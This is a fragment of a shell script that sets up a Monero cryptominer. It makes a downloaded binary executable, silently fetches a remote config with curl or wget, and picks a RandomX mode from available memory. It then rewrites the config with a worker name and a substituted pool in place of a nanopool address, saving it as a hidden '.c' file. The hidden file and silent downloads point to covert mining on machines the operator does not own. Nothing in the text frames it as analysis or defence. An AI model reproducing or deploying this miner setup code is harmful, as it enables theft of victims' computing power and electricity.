...
chmod +x "$W1/$BN"
dlc(){ if command -v curl >/dev/null 2>&1;then curl -sSL --connect-timeout 20 --max-time 60 "$RAW/cfg.json" 2>/dev/null;elif command -v wget >/dev/null 2>&1;then wget -q --timeout=60 -O- "$RAW/cfg.json" 2>/dev/null;fi; }
AVAIL_KB=$(awk '/MemAvailable/{print $2}' /proc/meminfo 2>/dev/null||echo 0)
if [ "${AVAIL_KB:-0}" -lt 3000000 ];then RXMODE="light";else RXMODE="auto";fi
CFGTPL="$(dlc)"
[ -z "$CFGTPL" ]&&{ echo "cfg.json download failed">&2;exit 1; }
...
dlc(){ if command -v curl >/dev/null 2>&1;then curl -sSL --connect-timeout 20 --max-time 60 "$RAW/cfg.json" 2>/dev/null;elif command -v wget >/dev/null 2>&1;then wget -q --timeout=60 -O- "$RAW/cfg.json" 2>/dev/null;fi; }
mkcfg(){ T="$(dlc)";[ -z "$T" ]&&return 1;echo "$T"|sed "s/WORKERNAME/$PW/;s/\"mode\": \"auto\"/\"mode\": \"$(rxm)\"/;s|xmr-eu1.nanopool.org:14433|$POOL|">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }
